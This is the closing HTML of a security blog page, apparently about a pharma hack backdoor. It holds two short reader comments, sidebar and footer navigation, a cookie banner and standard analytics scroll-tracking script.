			<p>How do you get rid of it?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7008">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/90fe77228cfa39ca2ccffb0140f41865?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/90fe77228cfa39ca2ccffb0140f41865?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ajaykumarmeher</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-04T15:51:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-7008">December 4, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>They will not tell you unless you are signed up for a plan 😉</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ol></div></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea5133da889">Search the blog</label><input type="search" name="s" id="searchform-62ea5133da889" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-14" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/anatomy-of-website-malware?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=Anatomy-of-Malware" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23220 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_anatomy-of-website-malware.png" alt="The Anatomy of Website Malware Webinar" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-36" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/what-is-seo-spam-and-how-to-fight-it?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=SEO-Spam" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23487 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_seo-spam.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: '​​', customerEmail: '​​'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
